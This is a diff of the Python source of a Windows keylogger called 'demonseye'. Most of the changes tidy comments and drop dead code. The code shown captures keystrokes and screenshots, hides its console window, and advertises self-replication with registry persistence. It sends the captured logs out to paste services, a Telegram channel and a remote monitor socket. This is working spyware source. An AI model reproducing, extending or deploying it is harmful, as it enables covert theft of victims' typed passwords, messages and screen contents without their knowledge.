@@ -18,16 +18,16 @@
 # GitHub:           https://github.com/gabimarti
 # Created:          19/05/2019
 # License:          GPLv3
-# First Release:
+# First Release:    04/09/2019
 # Version:          0.0.1
 #
 # Features:         * Record keystrokes
 #                   * Periodic screen capture
 #                   * Send data to a remote computer with Monitor App
-#                   * Send data to an email account
 #                   * Paste data to a Paste service
 #                   * Send images and paste urls to a Telegram private Channel with a Telegram Bot
-#                   * Send data to a Twitter account (to do)
+#                   * Self replicate and install on Windows Registry to maintain persistence
+#                   * Two methods of keystroke capture using different modules
 #
 # Build info:       For required modules and executable generation, please read the files in the /docs folder.
 #
@@ -37,15 +37,7 @@
 # Updates:
 #
 # -----------------------------------------------------------------------------------------------------------
-#  TODO:
-#       - auto clone app / copy to windows tmp
-#       - install in win registry
-#       - hide app (changing name in tasklist)
-#       - command line params: install registry, hide, etc.
-#       - monitor commands (get file list, get file contents, etc)
-#       - system disk info
-#       - memory info
-# -----------------------------------------------------------------------------------------------------------
+
 
 import config_gm as config
 import argparse
@@ -136,9 +128,9 @@ threadLock = threading.Lock()
 threadList = []
 
 # TCP Server control
-server_has_client = False  # Client connected ?
-client_thread = None  # This is a thread object of Client
-server = None  # Server object instance
+server_has_client = False                       # Client connected ?
+client_thread = None                            # This is a thread object of Client
+server = None                                   # Server object instance
 
 # Send to Monitor control variables
 monitor_soc = None                              # Socket that controls communication to monitor
@@ -164,17 +156,6 @@ class ScreenShootThread(threading.Thread):
 
     def run(self):
         logging.debug('Guardado captura {}'.format(self.screen_file))
-        '''
-        app = wx.App()                  # Need to create an App instance before doing anything
-        screen = wx.ScreenDC()
-        size_x, size_y = screen.GetSize()
-        bmp = wx.EmptyBitmap(size_x, size_y, -1)
-        mem = wx.MemoryDC(bmp)
-        mem.Blit(0, 0, size_x, size_y, screen, 0, 0)
-        del mem                         # free memory containing image capture
-        del app                         # free application instance object
-        bmp.SaveFile(self.screen_file, wx.BITMAP_TYPE_PNG)
-        '''
         # Take a screenshot using MSS module
         with mss.mss() as sct:
             self.screen_file = sct.shot(mon=1, output=self.screen_file)
@@ -246,12 +227,12 @@ class ServerListenerThread(threading.Thread):
             try:
                 (conn, (ip, port)) = self.server_socket.accept()
             except socket.timeout:
-                pass  # ignore timeout, next accept
+                pass    # Ignore timeout, next accept
             except Exception as e:
                 logging.error('Error recibiendo datos de cliente. Excepcion {} '.format(e))
-                break  # Possibly closed server
+                break   # Possibly closed server
             else:
-                # Inicia thread de respuesta - Starts client response thread
+                # Starts client response thread
                 client = ClientThread(conn, ip, port)
                 client.start()
                 self.client_threads.append(client)
@@ -284,23 +265,10 @@ def monitor_data_send(data_to_send):
 
             # Send Data
             data_to_send = bytes(data_to_send, ENCODING)
-            monitor_soc.sendall(data_to_send)                          # monitor_soc.sendall(data_to_send)
+            monitor_soc.sendall(data_to_send)
             logging.debug('Sended :{}'.format(data_to_send))
-            '''
-            file = open(keylog_name, 'rb')
-            bloc = file.read(SERVER_BUFFER_SIZE)
-            while bloc:
-                soc.sendall(bloc).encode(ENCODING)
-                bloc = file.read(SERVER_BUFFER_SIZE)
-            file.close()
-            '''
         except Exception as ex:
             logging.error('Error sending data to Monitor to {}:{}. Exception : {}'.format(monitor_ip, monitor_port, ex))
-        finally:
-            '''
-            if file:
-                file.close()
-            '''
     else:
         # Close connection if not enabled Send
         if monitor_soc:
@@ -362,7 +330,6 @@ def telegram_bot_message(message):
         (chat_id, username) = telegram_bot_get_chatid()
         logging.debug('Telegram Bot id: {} Username: {}'.format(chat_id, username))
         message = urllib.parse.quote_plus(message)
-        #params = '?text="{}"&chat_id={}'.format(message, chat_id)
         params = '?text="{}"&chat_id={}'.format(message, config.TELEGRAM_BOT_CHANNELID)
         url = config.TELEGRAM_BOT_URL + config.TELEGRAM_BOT_SEND + params
         logging.debug('Telegram Bot sending: {}'.format(url))
@@ -444,7 +411,7 @@ def paste_file(file_name, service):
     return url_file_pasted
 
 
-# Mail info send
+# Mail info send --- Used only in debugging tasks. Not implemented in the keylogger
 def send_email(message):
     if not config.SEND_EMAIL_ENABLED:
         return
@@ -463,10 +430,8 @@ def send_email(message):
             server_mail.starttls()
         server_mail.login(email_username, email_password)
         server_mail.sendmail(email_from_addr, email_to_addrs, message)
-
     except Exception as ex:
         logging.error('No he podido enviar mensaje. Excepcion : {}'.format(ex))
-
     finally:
         server_mail.quit()
 
@@ -512,7 +477,7 @@ def register_window_name(text):
     logging.debug('Window Name : {}'.format(text))
 
 
-# Register a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
+# Take a screenshot, add the name to the keylog file and then start a thread for recording to disk and send
 # it to the external service.
 def capture_screen():
     global key_buffer, threadList, args
@@ -529,17 +494,12 @@ def capture_screen():
 
 # Execute the necessary actions to send the keylog file to the different resources or services that have been defined.
 def send_keylog_file(keylog_name):
-    '''
-    Aqui envia el fichero al servidor  o servicios configurados
-    Hacer un 'paste' en un servidor
-    Publicar un tweet en cuenta privada con la url del paste
-    Opcionalmente hace envio por email para pruebas
-    '''
-    # Servicio Pastebin
+    # Pastebin
     logging.debug('Sending to Pastebin...')
     url_paste = paste_file(keylog_name, config.PASTE_PASTEBIN)
     logging.info('Pastebin url : {}'.format(url_paste))
 
+    # Pastecode
     logging.debug('Sending to Pastecode...')
     url_paste = paste_file(keylog_name, config.PASTE_PASTECODE)
     logging.info('Pastecode url : {}'.format(url_paste))
@@ -547,18 +507,6 @@ def send_keylog_file(keylog_name):
     # Sends to Telegram Channel the url of paste
     telegram_bot_message('New keylogger paste: {}'.format(url_paste))
 
-    '''
-    logging.debug('Sending to Telegram...')
-    url_paste = paste_file(keylog_name, config.PASTE_TELEGRAM)
-    logging.info('Pastecode url : {}'.format(url_paste))
-    '''
-
-    # Envia a Monitor
-    # monitor_data_send()
-    # El envio a al monitor se hace en tiempo real y es llamado cada vez que se almacena un caracter.
-
-    # Envia a Twitter
-    pass
     return True
 
 
@@ -610,22 +558,12 @@ def flush_key_buffer_to_disk():
     return True
 
 
-# Returns if a special key can be saved to the keylog
-def save_special_control_key(event):
-    switcher = {
-        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': False, 'LCONTROL': True, 'RCONTROL': True,
-        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True, 'BACK': True, 'DELETE': True,
-        'HOME': True, 'END': True, 'PRIOR': True, 'NEXT': True, 'ESCAPE': True
-    }
-    return switcher.get(event.Key.upper(), True)
-
-
 # pynput | keyboard event hook
 def on_press_key_pynput(key):
     global key_buffer, key_max_chars, key_counter, args, key_previous
 
     close_app = False
-    # check exit keylogger
+    # Check exit key combination
     if key_previous == keyboard.Key.ctrl_l and str(key).strip("'") == PYNPUT_CTRL_EXIT_CHR:
         logging.debug('Cerrando aplicación por combinación especial de tecla')
         close_app = True
@@ -664,19 +602,27 @@ def on_press_key_pynput(key):
         return True
 
 
+# pyWinHook | Returns if a special key can be saved to the keylog
+def save_special_control_key(event):
+    switcher = {
+        'TAB': True, 'LSHIFT': False, 'RSHIFT': False, 'CAPITAL': False, 'LCONTROL': True, 'RCONTROL': True,
+        'LMENU': True, 'RMENU': True, 'LWIN': False, 'RETURN': True, 'BACK': True, 'DELETE': True,
+        'HOME': True, 'END': True, 'PRIOR': True, 'NEXT': True, 'ESCAPE': True
+    }
+    return switcher.get(event.Key.upper(), True)
+
+
 # pyWinHook | Adds key to buffer
 def add_key_to_buffer_pyWinHook(event):
     global key_buffer, key_max_chars, key_counter, args
     key = event.Ascii
 
-    # asigna tecla. si es una tecla especial asigna string definiendo tipo de tecla
-    # si se desea mostrar el espacio como [SPACE] se debe de indicar (key < 33)
-    # en la condicion inferior, sino se mostrara un espacio en blanco tal cual.
+    # If you want to show the "space" as a special key,
+    # you must change the comparison (key <32) to (key <33)
     if (key < 32) or (key > 126):
         if save_special_control_key(event):
             ckey = '[' + event.Key.upper() + ']'
-            # Cada vez que se pulsa RETURN añade salto de linea y hace captura de pantalla
-            # With each press of RETURN add the line break and take a screenshot.
+            # With each press of RETURN adds a line break.
             if ckey == '[RETURN]':
                 ckey += CRLF
             key_buffer += ckey
@@ -686,22 +632,21 @@ def add_key_to_buffer_pyWinHook(event):
         ckey = chr(key)
         key_buffer += ckey
 
-    # inc key counter.
+    # Inc key counter and do screenshot if it's time
     if len(ckey) > 0:
-        # monitor_data_send(ckey)             # Sends data to monitor
         key_counter += 1
         # If the counter is a multiple of args.keystoscreenshot, do a screenshot.
         if key_counter % args.keystoscreenshot == 0:
             capture_screen()
 
-    # if buffer is full, it empties it and sends the file if necessary
+    # If buffer is full, it empties it and sends the file if necessary
     if len(key_buffer) > key_max_chars:
-        monitor_data_send(key_buffer)         # Sends buffer data to monitor
+        monitor_data_send(key_buffer)           # Sends buffer data to monitor
         flush_key_buffer_to_disk()
         # if the file size has exceeded the limit
         if os.path.getsize(keylog_name) >= args.filesizetrigger:
             keylog_send = keylog_name
-            create_keylog_file()                # creates new keylog file
+            create_keylog_file()                # Creates new keylog file
             send_keylog_file(keylog_send)
 
     return True
@@ -711,7 +656,7 @@ def add_key_to_buffer_pyWinHook(event):
 def on_mouse_event_pyWinHook(event):
     global old_event
 
-    # si el usuario cambia de ventana, la registra
+    # If the user changes the window, register it
     if (old_event is None or event.WindowName != old_event.WindowName) and event.WindowName is not None:
         register_window_name(repr(event.WindowName))
 
@@ -750,7 +695,7 @@ def on_keyboard_event_pyWinHook(event):
             key_buffer += CRLF + CRLF + "[" + msg + "]" + CRLF
             close_app = True
 
-        # save key to buffer
+        # Save key to buffer
         add_key_to_buffer_pyWinHook(event)
 
         # Saves current event info to compare with next one.
@@ -781,27 +726,32 @@ def exit_demonseye():
 
     # Stopping server
     server.stop_server()
+
+    '''
+    In principle, it is not necessary to force a kill for clients, 
+    but the function is provided if necessary in the future.
+    '''
     # kill_server_clients()
 
-    # do a last screenshot
+    # Do a last screenshot
     capture_screen()
 
-    # saves to keylog file the Closing Event, Date and Time
+    # Saves to keylog file the Closing Event, Date and Time
     key_buffer += CRLF + CRLF
     key_buffer += '[CLOSING PROGRAM]' + CRLF
     key_buffer += 'datetime=' + datetime.datetime.now().strftime('%Y-%m-%d %H:%M') + CRLF
 
-    # empty the key buffer to disk
+    # Empty the key buffer to disk
     flush_key_buffer_to_disk()
 
-    # send de last keylog capture file
+    # Send de last keylog capture file
     send_keylog_file(keylog_name)
 
-    # wait to all threads are finished
+    # Wait to all threads are finished
     for thr in threadList:
         thr.join()
 
-    # delete temp files
+    # Delete temp files
     deleted = delete_keylog_tempfile()
     deleted = delete_keylog_tempfile(SCRPRE + '*' + SCREXT, 'Borrado captura pantalla')
 
@@ -854,7 +804,7 @@ def self_replicate(exec_name):
 # Return Logging Level
 def set_logging_level(verbose_level):
     switcher = {
-        0:  sys.maxsize,                      # No logging, no print
+        0:  sys.maxsize,                # No logging, no print
         1:  logging.CRITICAL,
         2:  logging.ERROR,
         3:  logging.WARNING,
@@ -908,7 +858,7 @@ if args.logtofile:
 logging.basicConfig(level=set_logging_level(args.verbose), format=log_format, datefmt=log_date_fmt,
                     handlers=log_handlers)
 
-logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Screenshot every {} keys' +
+logging.debug('Command Line settings: Verbose: {} | Log to File: {} | No Screenshot: {} | Screenshot every {} keys'
               'File Size Trigger {} | Hook method {} '.
               format(args.verbose, args.logtofile, args.noscreenshot, args.keystoscreenshot, args.filesizetrigger,
                      args.hookmodule))
@@ -924,7 +874,6 @@ execname = sys.argv[0]
 filerealpath = os.path.realpath(execname)
 extension = os.path.splitext(filerealpath)[1]
 driveunit = os.path.splitdrive(filerealpath)[0]
-
 
 # Hide console Window
 if not args.nohide:
@@ -946,7 +895,6 @@ if args.replicate:
 # Create server that listens TCP petitions from Monitor
 server = ServerListenerThread(SERVER_IP, SERVER_PORT, SERVER_BUFFER_SIZE)
 server.start()
-# threadList.append(server)
 
 # Telegram Bot start message notifying that the keylogger is up and running with user and host
 telegram_bot_message('Iniciando {} v{} para el Usuario {} en el Equipo {} {}'
